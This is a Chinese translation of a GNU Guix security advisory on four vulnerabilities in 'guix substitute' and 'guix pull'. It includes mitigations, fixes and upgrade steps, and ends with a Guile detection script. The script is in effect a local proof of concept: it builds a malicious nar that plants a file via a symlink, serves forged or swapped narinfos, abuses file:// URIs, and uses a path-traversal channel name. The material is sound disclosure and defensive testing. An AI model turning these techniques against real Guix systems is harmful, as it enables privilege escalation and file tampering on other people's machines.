---
title: 科新文摘#2 | GNU Guix发现四个漏洞
date: 2026-07-05 16:42:30
tags: linux, abstract, gnu
license: cc_by_sa
---
### 摘要报道（来自LWN）
GNU Guix项目宣布`guix substitute`工具中存在三个漏洞，此外，`guix pull`和`guix time-machine`命令也存在一个漏洞。这些漏洞的影响范围很广，从远程权限提升到本地敏感文件泄露都有可能。

文章指出：

{% callout type="primary" %}
远程利用`guix substitute`漏洞只需要易受攻击的系统尝试下载一个二进制替代文件即可。任何已配置的替代服务器，包括使用`guix-daemon`的`--discover`选项发现的服务器，都可以利用此漏洞，中间人攻击 (MITM) 也可以利用此漏洞，无论替代服务器URL中是否使用https。

本地利用`guix substitute`程序只需要能够连接到`guix-daemon`的套接字，而默认情况下任何用户都可以做到这一点。

另外，`guix pull`和`guix time-machine`中还发现了另一个安全问题（CVE ID待定），任何能够控制这些命令使用的通道文件的人都可以在运行相关命令的用户有权创建文件的任何位置创建或覆盖该文件。
{% endcallout %}

项目建议所有用户立即升级`guix`和`guix-daemon`。请参阅公告了解具体操作步骤、漏洞测试方法、披露时间表等信息。

### 全文（来自GNU Guix）

原题：‘guix substitute’ and ‘guix pull’ Vulnerabilities
作者：Caleb Ristvedt — 2026-07-02

---

`guix-daemon`调用的辅助工具`guix substitute`中发现了多个安全漏洞（CVE ID待定），这些漏洞可能导致多种恶意活动，包括远程提升至构建守护进程用户的权限、远程存储损坏，以及可能泄露构建守护进程用户可访问的敏感文件。所有系统均受影响，无论`guix-daemon`是否以root权限运行；当`guix-daemon`以非root权限运行时，其危害较小。强烈建议您立即升级守护进程（参见以下说明），并仔细考虑是否在升级时向所有guix命令传递`--no-substitutes`参数（参见“升级”部分中的注释）。

远程利用`guix substitute`漏洞只需易受攻击的系统尝试下载二进制替代文件即可。任何已配置的替代服务器（包括使用`guix-daemon`的`--discover`选项发现的服务器）均可利用此漏洞，中间人攻击 (MITM) 也同样可以利用此漏洞，无论替代服务器 URL 中是否使用 https。

本地利用`guix substitute`漏洞只需能够连接`到guix-daemon`的套接字，而默认情况下任何用户都拥有此权限。

此外，`guix pull`和`guix time-machine`中还发现了另一个安全问题（CVE ID待定）。该漏洞允许任何能够控制这些命令所用通道文件的用户，在运行相关命令的用户拥有创建权限的任何位置创建或覆盖文件。无论通道文件是否在沙箱中执行，也无论使用的通道是否仅限于与受信任通道共享引号的通道，此漏洞都可能被利用。由于创建或覆盖的文件内容受到限制，这主要构成拒绝服务攻击风险，但理论上其危害可能更大。

#### 漏洞

已发现三个影响`guix substitute`的独立漏洞，第四个漏洞影响`guix pull`和`guix time-machine`：
1. （CVE 编号待定）Guile 代码用于解包替代文件的恢复文件（位于 `(guix serialization)` 中）并未针对恶意输入进行加固，而是在下载替代文件的同时调用该程序进行提取，而不是等到整个归档文件下载完毕并验证其哈希值后再进行提取。这些因素共同导致任何替代文件服务器（或任何能够冒充服务器的实体）都可以向受影响系统上守护进程用户拥有写入权限的任何位置写入任意文件。如果守护进程以 root 用户身份运行，则包括 /etc/passwd 文件。
为了避免依赖X.509公钥基础设施，用于获取可用替代文件元数据（称为`narinfos`）的`fetch-narinfos`程序不会验证服务器证书，因为`narinfos`的规范部分无论如何都需要签名才能被视为有效。不幸的是，替代文件的URL并非此类规范部分，因此它可以被替换为攻击者控制的URL。如果下载的替代文件与narinfo中的签名哈希值不匹配，则会被拒绝，但为时已晚：替代文件在下载过程中已被提取，因此损害已经造成。
这意味着，即使负责实际下载替代文件的`download-nar`程序本身会验证服务器证书，但在替代服务器URL中使用https也无法限制攻击者，因为证书只需适用于攻击者控制的URL即可。
`restore-file`也被其他工具使用，包括`guix offload`、`guix archive --extract`和`guix challenge`。如果向这些工具提供不可信的输入，它们都可能以相同的方式被利用。

2. （CVE 编号待定）获取可用替代文件元数据（称为`narinfo`）的程序（位于 `(guix substitutes)` 中）及其在 `(guix scripts substitute)` 中的调用者均未验证其获取的`narinfo`是否为请求的`narinfo`。因此，替代服务器（或任何能够冒充替代服务器的人）有可能诱骗`guix substitute`使用任何已授权替代的store item来替代任何其他已授权替代的store item。这造成的危害程度部分取决于已授权替代服务器已签名或可被说服签名的store item，但至少这可以导致使用过时且不安全的软件版本。

3. （CVE 编号待定）`(guix scripts substitute)`中的`guix substitute`实现允许使用`file://` URI来指定替换服务器URI（`narinfo`文件所在位置）以及在`narinfo`文件中指定相应归档文件的下载位置。它不区分通过`guix-daemon`命令行传递的`--substitute-urls`和通过guix命令行（用户端侧）传递的`--substitute-urls`，后者优先于前者。打开这些`file://` URI会遵循符号链接。因此，不受信任的客户端可能会导致守护进程读取任何文件。如果其中某一行看起来不像有效的`narinfo`行（它使用`recutils`格式），`guix substitute`可能会抛出异常，并将包含该行的回溯信息传递给客户端。例如，如果守护进程用户可以读取一个仅包含一行秘密密码短语的文件，那么该文件的内容可能会被任何本地用户获取。
此外，当使用`file://` URI作为nar下载文件的URI时，如果它恰好是Guix和Nix使用的有效的nar（“规范化归档”）文件，则该文件可能会被写入存储区。不过，这种情况发生的可能性很小。
除了可能导致秘密信息泄露之外，这种方法还可以通过`/proc/PID/fd`中的文件干扰任何守护进程用户可追踪的进程正在读取的文件。

4. （CVE 待分配）`guix pull`和`guix time-machine`用于验证通道的`(guix channels)`中的`authenticate-channel`函数，会将一个从通道名称派生的缓存键传递给`(guix git-authenticate)`中的`authenticate-repository`函数。该缓存键用于确定存储先前已验证提交ID的文件名。如果通道名称的格式为“../../../../newfile”，则可能导致在用户主目录中创建名为“newfile”的文件。如果“newfile”已存在，则该函数也可能覆盖它，但前提是该文件已经是一个类似Scheme语法的字符串列表，因为必须先读取并处理其内容，才能写入新内容。
如果执行写入操作，输出将仅包含Scheme语法的注释、换行符以及对应于Git提交标识符的十六进制字符串列表。这使得该漏洞难以用于除拒绝服务攻击之外的实际攻击，但需要注意的是，由于它可以攻击`/proc`目录下的文件，因此足够有创造力且了解内情的攻击者或许能够进一步利用此漏洞。
实际上，只有在使用新添加的机制获取远程通道文件时，才能利用此漏洞。

#### 缓解措施
可以通过不使用替代文件来缓解漏洞(1)和(2)的远程攻击，方法是向·guix-daemon·传递`--no-substitutes`参数，或者向所有`guix`命令传递`--no-substitutes`参数。但是，始终可以为单个客户端重新启用替代文件，因此这种方法无法防御本地攻击者利用漏洞(1)、(2)或(3)的攻击，这些漏洞无法缓解，必须通过更新来修复。可以通过不使用不受信任的通道文件运行`guix pull`或`guix time-machine`来缓解漏洞(4)。

本文末尾提供了一个用于检测这些漏洞的测试。您可以使用以下命令运行此代码：

{% codeblock lang:bash %}
guix repl -- guix-substitute-and-pull-vuln-check.scm
{% endcodeblock %}

这将输出4行内容，分别以`restore-file`、`fetch-narinfos`、`file-uris`和`cache-key`开头，每行后跟一个冒号、一个空格，以及“vulnerable”（易受攻击）或“not vulnerable”（不易受攻击）的文本，具体取决于正在运行的`guix-daemon`是否存在指定的漏洞。如果所有4行都显示“not vulnerable”，则`guix repl`将以状态码**0**退出；否则，将以状态码**1**退出。

某些测试在某些情况下可能无法产生结果。此时，测试名称后的输出将以“error:”开头。无法产生结果的测试应被视为结果不确定。

如果未授权任何替代程序，或者无法通过任何已配置的替代URL访问当前`guix`的`cfunge`、`hello`或`sed`包的授权替代程序，则`restore-file`和`fetch-narinfos`测试可能无法产生结果。如果`cfunge`可从某些垃圾回收根目录（例如`profile`）访问，则`restore-file`测试可能无法产生结果。如果无法通过网络访问Codeberg来获取`guix-science`频道的部分历史记录，则`cache-key`测试可能无法产生结果。可以通过编辑脚本中`guix-science-url`的定义来解决此问题，将其设置为可以找到`guix-science`存储库副本的任何URL（或文件名）。

#### 修复

这些安全问题已通过一系列11个提交修复，从[ed0a97](https://codeberg.org/guix/guix/commit/ed0a9721f8a20d6ddcf6a0495302f502b3f7bb17)开始，到[2ef8ed](https://codeberg.org/guix/guix/commit/2ef8ed9f0df53bddf14bdecc2ea48c2d233213cc)结束，作为[PR #9665](https://codeberg.org/guix/guix/pulls/9665)的一部分。用户应确保已升级到提交[897832](https://codeberg.org/guix/guix/commit/897832f374dcdc9eeaf19d01e70b9a92fccfc68c)或任何后续提交，以避免这些漏洞。升级说明请参见以下部分。

修复漏洞(1)涉及强化`restore-file`，使其能够检测并拒绝无效的目录条目名称。具体而言，条目名称必须唯一、严格升序、不为空、不等于“.”或“..”，且不包含“/”或空字节。此外，目前用作`restore-file`函数的`#:dump-file`参数的程序已被修改，强制要求重新创建目标文件，并且绝不使用符号链接。

这项修改的灵感来源于对`nix/libutil/archive.cc`文件中`parse`函数的`nar-parsing`实现的分析。分析发现，该实现本身并不存在漏洞，但其安全性几乎达到了漏洞的临界点，仅因所使用的文件系统原语全部拒绝使用符号链接或接受已存在的目标而勉强得以避免（详情请参见此提交信息）。为了避免下次有人仔细检查时再浪费3个小时来发现这个问题，该实现也被重写，使其更加严格且安全性更高。或许并不令人意外的是，当Nix修改该代码以使用`std::filesystem`中更为宽松的文件系统原语时，最终导致了**CVE-2024-45593**的出现。

修复漏洞(2)涉及修改`fetch-narinfos`，使其在结果与请求不匹配时不包含该结果。

修复漏洞(3)涉及修改`(guix scripts substitute)`以验证所有来自不受信任来源的替换URL是否都不是`file://` URL，以及`narinfos`中的所有nar URL是否都不是`file://` URL（除非设置了特殊标志，而这仅在测试套件中执行）。

此外，我们还进行了一些额外的加固措施，将替换项恢复到临时目录中，只有在哈希值验证通过后才会将其移动到最终的存储项路径。虽然这仍然会在验证哈希值之前恢复它们，因此无法阻止漏洞(1)的发生，但它确实确保了攻击者控制的内容不会出现在曾经有效的存储项路径中（如果某些用户或程序没有注意到最近的垃圾回收，则可能仍然认为这些路径有效）。我们还修改了`narinfo`读取代码，使其拒绝任何`StorePath`、`References`或`Deriver`字段包含不符合存储项路径语法要求的路径的`narinfo`文件。这样做的一个好处是，我们现在有了验证存储项路径语法的程序。

修复漏洞(4)涉及更改`authenticate-repository`用户默认计算`cache-key`的方式。缓存键不再源自频道名称或（对于`guix git authenticate`）仓库URL，而是源自初始提交的ID，这是一个非常安全的十六进制字符串。这避免了一些奇怪且潜在危险的行为，例如两个名称相同但其他方面完全不同的频道之间可能会共享已验证的缓存提交ID。此外，`authenticate-repository`还进行了额外的安全加固，将缓存键中所有出现的点号 (.) 都替换为连字符 (-)，这样即使提供了非默认的缓存键，也无法逃逸缓存目录。

#### 升级

鉴于此安全公告的严重性，我们强烈建议所有用户立即升级`guix`和`guix-daemon`。

> 注意：细心的读者可能已经注意到一个两难困境：获取更新的最快方法是通过替代服务器，而缓解最严重的远程可利用漏洞的方法是禁用替代服务器。因此，是否使用`--no-substitutes`参数需要根据具体情况判断，并考虑以下因素：这些漏洞公开的时间、您的系统与替代服务器之间的网络路径的暴露程度、相关系统自行构建`guix`的可行性（这部分取决于您上次升级的时间）、相关系统是否有多个用户，当然还有您的威胁模型。

对于Guix系统，操作步骤是在执行`guix pull`命令后重新配置系统，方法是重启`guix-daemon`或重启系统。例如：

{% codeblock lang:bash %}
guix pull
sudo guix system reconfigure /run/current-system/configuration.scm
sudo herd restart guix-daemon
{% endcodeblock %}

其中 `/run/current-system/configuration.scm` 是当前系统配置，当然也可以替换为用户选择的其他系统配置文件。

对于其他发行版上的Guix，需要使用`sudo`执行`guix pull`命令，因为`guix-daemon`以root用户身份运行，然后按照文档说明重启`guix-daemon`服务。例如，在采用`systemd`管理服务的系统上，运行以下命令：

{% codeblock lang:bash %}
sudo --login guix pull
sudo systemctl restart guix-daemon.service
{% endcodeblock %}

请注意，如果您使用的是发行版自带的Guix软件包（而非通过安装脚本安装），则可能需要采取其他步骤或根据发行版上其他软件包的安装方式升级Guix软件包。有关更多信息或疑问，请参阅发行版的相关文档或联系软件包维护者。

#### 时间线

- 2026年5月28日，Nix的Jörg Thalheim将恢复文件漏洞分享给了Christopher Baines和Andreas Enge；Christopher将详细信息发送给了安全响应团队。
- 2026年6月4日，Andreas Enge通知了Caleb Ristvedt和Ludovic Courtès，他们开始着手修复。
- 2026年6月10日，Caleb Ristvedt发现了`guix substitute`的`file://`漏洞。
- 2026年6月22日，Caleb Ristvedt发现了第三个漏洞：`guix substitute`没有验证它获取的`narinfo`是否是它请求的。
- 2026年6月24日，根据Sergio Pastor-Pérez报告的问题，Ludovic Courtès发现了`pull`和`time-machine`漏洞，并着手修复。为了方便起见，并且由于线索是公开的，因此决定立即修复该漏洞，并与其他漏洞同时公布。

#### 结论

我们衷心感谢Jörg Thalheim分享恢复文件漏洞，感谢Christopher Baines验证该漏洞并通知安全响应团队，感谢Andreas Enge确保Ludovic和Caleb能够获知该漏洞，并协助与Jörg保持沟通。

我们还要感谢安全响应团队的John Kehayias的协调工作以及申请CVE编号。

#### 漏洞检测
以下代码用于检查您的`guix-daemon`是否存在前三个漏洞以及您的`guix`是否存在第四个漏洞。将此文件另存为`guix-substitute-and-pull-vuln-check.scm`，并按照上述“缓解”部分的说明运行。

{% codeblock guix-substitute-and-pull-vuln-check.scm lang:lisp line_number:true highlight:true first_line:1 %}
(use-modules (git)
             (guix build utils)
             (guix derivations)
             (guix channels)
             (guix config)
             (guix gexp)
             (guix git)
             (guix narinfo)
             (guix packages)
             (guix pki)
             (guix utils)
             (guix serialization)
             (guix store)
             (guix substitutes)
             ((gnu packages base) #:hide (which))
             (gnu packages esolangs)
             (srfi srfi-1)
             (srfi srfi-26)
             (srfi srfi-31)
             (srfi srfi-34)
             (rnrs bytevectors)
             (ice-9 atomic)
             (ice-9 binary-ports)
             (ice-9 control)
             (ice-9 match)
             (ice-9 popen)
             (ice-9 rdelim)
             (ice-9 textual-ports)
             (ice-9 threads)
             (web response)
             (web request)
             (web uri)
             (web server)
             (web server http))

;; 1. restore-file

;; Craft an invalid nar, identify a substitutable path that doesn't exist (gc
;; if necessary), get its signed narinfo, start an http server, connect to
;; store, set substitute urls, ask to substitute the chosen path.  Have http
;; server serve the signed narinfo with the URLs replaced with its own.  When
;; the nar is requested, serve the invalid nar.  Once the substitution errors
;; out (hash doesn't match), check whether the chosen file now exists with the
;; specified contents.  We're vulnerable if and only if it does.

(define target-file
  "/tmp/guix-restore-file-vulnerable")

(define target-substitutable-package
  ;; pick something obscure but in the main guix channel, so it is either not
  ;; currently valid or can probably be gc'ed.  This is just to make the test
  ;; more reliable - in real exploitation, an attacker can sit around and wait
  ;; for any substitute request to be made, but here we need to provoke one in
  ;; a timely manner.
  cfunge)

(define substitute-servers
  (with-store store
    (substitute-urls store)))

;; Grafts can cause package->derivation to actually start substituting outputs
;; of the derivation being computed, which means we'd have to gc it afterward.
(%graft? #f)

(define (package->path+narinfo store package)
  (define path
    (derivation->output-path (run-with-store store (lower-object package))))

  (match (lookup-narinfos/diverse substitute-servers (list path)
                                  valid-narinfo?)
    ((info) (values path info))
    (() (values #f #f))))

(define (restore-file-vuln?)
  (define-values (target-path target-info)
    (call-with-values (lambda ()
                        (with-store store
                          
                          (package->path+narinfo store
                                                 target-substitutable-package)))
      (lambda (path info)
        (unless info
          (error "can't find substitutable path to test 'restore-file' with\n"))
        (with-store store
          (when (valid-path? store path)
            (when (null? (delete-paths store (list path)))
              (error "can't delete substitutable path to test 'restore-file' with\n"))))
        (values path info))))

  (define new-target-info-contents
    (let* ((contents (narinfo-contents target-info))
           (signature-index (string-contains contents "Signature:"))
           (after-signature-index (string-index contents #\newline
                                                signature-index))
           (signed-contents (string-take contents (or after-signature-index
                                                      (string-length
                                                       contents)))))
      (string-append signed-contents "
URL: example.nar
Compression: none
NarSize: 0\n")))

  ;; We can't delete target-file if it's owned by root, so overwrite it with
  ;; fresh, mostly-random contents each time, and check that the contents match.
  (define test-contents
    (format #f "VULNERABLE!~%~S:~S~%" (getpid) (random 100000000)))

  (define test-nar
    (call-with-output-bytevector
     (lambda (port)
       (for-each (lambda (s)
                   (write-string s port))
                 `("nix-archive-1"
                   "(" "type" "directory"
                   "entry" "(" "name" "a"
                   "node" "(" "type" "symlink"
                   "target" ,target-file ")" ")"
                   "entry" "(" "name" "a"
                   "node" "(" "type" "regular"
                   "contents" ,test-contents  ")" ")"
                   ")")))))

  (define bad-request
    (build-response #:code 400 #:reason-phrase "Unexpected request"))

  (define target-uri-path
    (string-append "/" (store-path-hash-part target-path) ".narinfo"))

  (define nar-uri-path "/example.nar")

  (define (handle request body)
    (cond
     ((not (eq? (request-method request) 'GET))
      (values bad-request ""))
     ((string=? (uri-path (request-uri request)) target-uri-path)
      (format (current-error-port)
              "Returning narinfo pointing to test nar~%")
      (values (build-response #:code 200)
              new-target-info-contents))
     ((string=? (uri-path (request-uri request)) nar-uri-path)
      (format (current-error-port) "Returning test nar~%")
      (values (build-response #:code 200)
              test-nar))
     (else
      (values bad-request ""))))

  (call-with-port (socket PF_INET SOCK_STREAM 0)
    (lambda (sock)
      (setsockopt sock SOL_SOCKET SO_REUSEADDR 1)
      (bind sock (make-socket-address AF_INET INADDR_LOOPBACK 0))
      (listen sock 5)
      (let* ((port-number (sockaddr:port (getsockname sock)))
             (substitute-url (string-append "http://localhost:"
                                            (number->string port-number)
                                            "/"))
             (server-thread (call-with-new-thread
                             (lambda ()
                               (run-server handle http
                                           `(#:socket ,sock))))))
        (with-store store
          (set-build-options store
                             #:substitute-urls (list substitute-url))
          (guard (c ((store-error? c)
                     ;; XXX doesn't actually cancel until something tries
                     ;; connecting
                     (cancel-thread server-thread)
                     ;;(join-thread server-thread)
                     (and (file-exists? target-file)
                          (string=? (call-with-input-file target-file
                                      get-string-all)
                                    test-contents))))
            (build-things store (list target-path))
            ;; If the substitution actually completes without throwing then we
            ;; are most definitely vulnerable, but not just in 'restore-path'.
            (error "!!!substitution of invalid nar completed???!!!")))))))



;; 2. fetch-narinfos

;; Identify two substitutable paths P1 and P2.  Get P1 and P2's signed
;; narinfos, start an http server, connect to store, set substitute urls, ask
;; whether P1 and P2 are substitutable.  Have http server serve P2's narinfo
;; when asked for P1's, and P1's when asked for P2's.  If vulnerable, it will
;; report that both are substitutable, if not, it will report that neither
;; are.

;; We need two substitutable paths because the daemon<-->'guix substitute
;; --query' interface verifies that the info it gets back is for a path that
;; was requested, so the "replacement" path has to also be queried for
;; substitutability at the same time.

(define (fetch-narinfos-vuln?)
  (define-values (hello-path hello-info)
    (with-store store (package->path+narinfo store hello)))

  (define-values (sed-path sed-info)
    (with-store store (package->path+narinfo store sed)))

  (define bad-request
    (build-response #:code 400 #:reason-phrase "Unexpected request"))

  (define hello-uri-path
    (string-append "/" (store-path-hash-part hello-path) ".narinfo"))

  (define sed-uri-path
    (string-append "/" (store-path-hash-part sed-path) ".narinfo"))

  (define (handle request body)
    (cond
     ((not (eq? (request-method request) 'GET))
      (values bad-request ""))
     ((string=? (uri-path (request-uri request)) hello-uri-path)
      (format (current-error-port) "Returning sed when asked for hello~%")
      ;; Return the wrong result
      (values (build-response #:code 200)
              (narinfo-contents sed-info)))
     ((string=? (uri-path (request-uri request)) sed-uri-path)
      (format (current-error-port) "Returning hello when asked for sed~%")
      ;; Return the wrong result
      (values (build-response #:code 200)
              (narinfo-contents hello-info)))
     (else
      (values bad-request ""))))

  (unless (and hello-info sed-info)
    (error "can't find substitutable paths to test 'fetch-narinfos' with"))

  (call-with-port (socket PF_INET SOCK_STREAM 0)
    (lambda (sock)
      (setsockopt sock SOL_SOCKET SO_REUSEADDR 1)
      (bind sock (make-socket-address AF_INET INADDR_LOOPBACK 0))
      (listen sock 5)
      (let* ((port-number (sockaddr:port (getsockname sock)))
             (substitute-url (string-append "http://localhost:"
                                            (number->string port-number)
                                            "/"))
             (server-thread (call-with-new-thread
                             (lambda ()
                               (run-server handle http
                                           `(#:socket ,sock))))))
        (with-store store
          (set-build-options store
                             #:substitute-urls (list substitute-url))
          (let ((substitutables
                 (substitutable-paths store (list hello-path sed-path))))
            ;; XXX doesn't actually cancel until something tries connecting
            (cancel-thread server-thread)
            ;;(join-thread server-thread)
            (not (null? substitutables))))))))

;; 3. file-uris

;; Create a fifo whose name is 32 nix-base32 characters followed by
;; ".narinfo", connect to store, set substitute urls to point to containing
;; directory, spawn a thread to block trying to open fifo write-only which
;; will subsequently set a flag and close the port, then ask whether some
;; store path with that hash is substitutable.  It should fail in all cases.
;; Check whether the flag is set; if so, we're vulnerable, otherwise we're
;; not.

(define (file-uris-vuln?)
  (call-with-temporary-directory
   (lambda (directory)
     (define testfifo
       (string-append directory "/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.narinfo"))
     (define opened? (make-atomic-box #f))
     (define store-item
       (string-append (%store-prefix) "/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa-foo"))

     (define open-thread
       (begin
         (mknod testfifo 'fifo #o744 0)
         (call-with-new-thread
          (lambda ()
            (call-with-port (open testfifo O_WRONLY)
              (lambda (port)
                (atomic-box-set! opened? #t))))))) 

     (with-store store
       (set-build-options store
                          #:substitute-urls (list (string-append "file://" directory)))
       (guard (c ((store-error? c)
                  (cancel-thread open-thread)
                  (delete-file testfifo)
                  ;; even though the file it is trying to open no longer
                  ;; exists, the kernel doesn't give a result to open-thread
                  ;; until someone ptraces it (or maybe sends a signal or
                  ;; something).
                  ;; (join-thread open-thread)
                  (atomic-box-ref opened?)))
         (substitutable-paths store (list store-item))
         (error "not supposed to get here!\n"))))))

;; 4. cache-key

;; Create a barebones git repository that is a valid channel, create a
;; <channel> that references it using a malformed name, set XDG_CACHE_HOME to
;; a directory inside a temporary directory (so that 'cache-directory' points
;; to a subdirectory of it), call authenticate-channel, see if a file outside
;; of XDG_CACHE_HOME gets created.

;; If you don't have Internet access, edit this to point to a local repository
;; containing at least commit 5a2d9baeda971df575c017669bca8eb8faa22ebd and its
;; ancestors, and the keyring branch.
(define guix-science-url
  "https://codeberg.org/guix-science/guix-science.git")

(define (create-test-channel directory channel-name)
  "Populate REPOSITORY with the necessary contents for it to be a valid
channel with 2 commits, then return three values: a <channel> for it with name
CHANNEL-NAME and an introduction to the first commit, the first commit, and
the second commit."
  (define intro-commit
    "b1fe5aaff3ab48e798a4cce02f0212bc91f423dc")

  (define end-commit ;; The commit following intro-commit
    "5a2d9baeda971df575c017669bca8eb8faa22ebd")

  (define fingerprint
    "CA4F 8CF4 37D7 478F DA05  5FD4 4213 7701 1A37 8446")

  (define git %git) ;; From (guix config), guix has a hard dependency on git

  (with-directory-excursion directory
    (invoke git "init"
            ;; Silence warning
            "--initial-branch=main")
    (invoke git "remote" "add" "--" "origin" guix-science-url)
    (invoke git "fetch" "--" "origin" end-commit)
    (invoke git "checkout" "FETCH_HEAD")
    (invoke git "fetch" "--" "origin" "refs/heads/keyring:keyring")
    (values
     (channel
       (name channel-name)
       (url (canonicalize-path directory))
       (introduction (make-channel-introduction
                      intro-commit
                      (openpgp-fingerprint fingerprint))))
     intro-commit
     end-commit)))

(define (cache-key-vuln?)
  (call-with-temporary-directory
   (lambda (directory)
     (let ((home (string-append directory "/home"))
           (channel-repo (string-append directory "/channel-repo"))
           (testfile (string-append directory "/testfile")))
       (mkdir home)
       (mkdir channel-repo)
       (with-environment-variables `(("HOME" ,home)
                                     ("XDG_CACHE_HOME" ,(string-append home
                                                                       "/.cache")))
         (call-with-values
             (lambda ()
               (create-test-channel channel-repo
                                    (string->symbol "../../../../../testfile")))
           (lambda (channel first-commit last-commit)
             (authenticate-channel channel channel-repo last-commit
                                   #:keyring-reference-prefix "")))
         (file-exists? testfile))))))

;; Results

(define vulnerabilities
  (list (list "restore-file" restore-file-vuln?)
        (list "fetch-narinfos" fetch-narinfos-vuln?)
        (list "file-uris" file-uris-vuln?)
        (list "cache-key" cache-key-vuln?)))

(define (call-with-errors-to-string proc)
  (define tag (make-prompt-tag))
  (call-with-prompt tag
    (lambda ()
      (with-throw-handler #t
        proc
        (rec (self key . args)
             (let* ((stack (make-stack #t
                                       1 ;self ;; Causes make-stack to return #f??
                                       tag
                                       ))
                    (frames (stack-length stack))
                    (frame (stack-ref stack 0)))
               (define error-string
                 (match args
                   (((or (? string? proc) (? symbol? proc))
                     (? string? message) (args ...) . rest)
                    (call-with-output-string
                      (lambda (port)
                        (display-error frame port proc message args
                                       rest))))
                   (args
                    (call-with-output-string
                      (lambda (port)
                        (print-exception port frame key args))))))

               (display-backtrace stack (current-error-port))
               (display error-string (current-error-port))
               (abort-to-prompt tag (string-append "error: "
                                                   (string-trim-both
                                                    error-string)))))))
    (lambda (_ . args)
      (apply values args))))

(define results
  (map (match-lambda
         ((name proc)
          (list name (if (string? proc)
                         proc ;; pass message through
                         (call-with-errors-to-string proc)))))
       vulnerabilities))

(for-each (match-lambda
            ((name vulnerable?)
             (format #t "~a: ~a~%"
                     name
                     (if (boolean? vulnerable?)
                         (if vulnerable? "vulnerable" "not vulnerable")
                         vulnerable?))))
          results)

(exit (if (any second results) 1 0))
{% endcodeblock %}
